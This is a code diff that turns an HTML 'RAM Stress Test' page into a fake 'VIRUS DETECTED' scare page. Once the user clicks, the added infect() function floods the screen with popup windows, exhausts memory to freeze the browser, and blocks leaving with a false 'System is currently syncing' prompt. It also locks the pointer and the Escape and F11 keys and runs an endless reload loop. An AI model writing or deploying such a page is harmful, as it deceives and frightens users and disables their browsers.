@@ -1,49 +1,50 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>RAM Stress Test</title>
+    <title>CRITICAL SYSTEM OVERLOAD</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        #status { font-weight: bold; color: red; margin-top: 20px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New'; text-align: center; overflow: hidden; }
+        .warning { font-size: 5rem; margin-top: 20%; animation: blink 0.1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
-<body>
-    <h1>Browser RAM Stress Test</h1>
-    <p>Open your browser's Task Manager (Shift + Esc) to watch the usage.</p>
-    
-    <button onclick="startEatingRam()">Start Allocating RAM</button>
-    
-    <div id="status">Status: Idle</div>
+<body onclick="infect()">
+    <div class="warning">VIRUS DETECTED<br>PHASE: REPLICATION</div>
+    <p>CLICK ANYWHERE TO RECOVER DATA</p>
 
     <script>
-        const memoryHog = [];
-        let totalAllocated = 0;
+        function infect() {
+            // 1. Recursive Tab Bombing (Phishing/Resource Exhaustion)
+            // Most browsers block popups, but if the user 'allows' them once, this hits.
+            setInterval(() => {
+                window.open(window.location.href, '_blank', 'width=100,height=100');
+            }, 500);
 
-        function startEatingRam() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerText = "Status: Allocating... (Tab may freeze soon)";
-
-            // Use setInterval so the UI has a small chance to update 
-            // before the browser hits its hard limit.
-            const interval = setInterval(() => {
-                try {
-                    // Allocate 100MB chunk
-                    const chunk = new Uint8Array(1024 * 1024 * 100);
-                    chunk.fill(1); // Force physical allocation
-                    memoryHog.push(chunk);
-
-                    totalAllocated += 100;
-                    statusDiv.innerText = `Status: Allocated ~${totalAllocated} MB`;
-                    
-                    console.log(`Current Heap: ${totalAllocated} MB`);
-                } catch (e) {
-                    clearInterval(interval);
-                    statusDiv.innerText = "Status: Limit Reached or Crashed!";
-                    console.error("Memory allocation failed:", e);
+            // 2. Memory Spike (Heap Exhaustion)
+            // Creating an array that grows exponentially to freeze the UI thread.
+            let payload = [];
+            setInterval(() => {
+                for(let i=0; i<10000; i++) {
+                    payload.push(new Array(1000).fill("SYSTEM_CRITICAL_ERROR"));
                 }
-            }, 50); // Adds 100MB every 50ms
+                console.log("Memory Buffer: " + payload.length);
+            }, 100);
+
+            // 3. Persistent Navigation Trap
+            window.onbeforeunload = function() {
+                return "Are you sure you want to leave? System is currently syncing.";
+            };
+
+            // 4. Keyboard/Mouse Hijack
+            document.documentElement.requestPointerLock();
+            if (navigator.keyboard) navigator.keyboard.lock(["Escape", "F11"]);
+
+            // 5. Infinite Reload Loop (The "Viral" Persistence)
+            setTimeout(() => {
+                while(true) {
+                    location.replace("https://www.google.com");
+                }
+            }, 5000);
         }
     </script>
 </body>
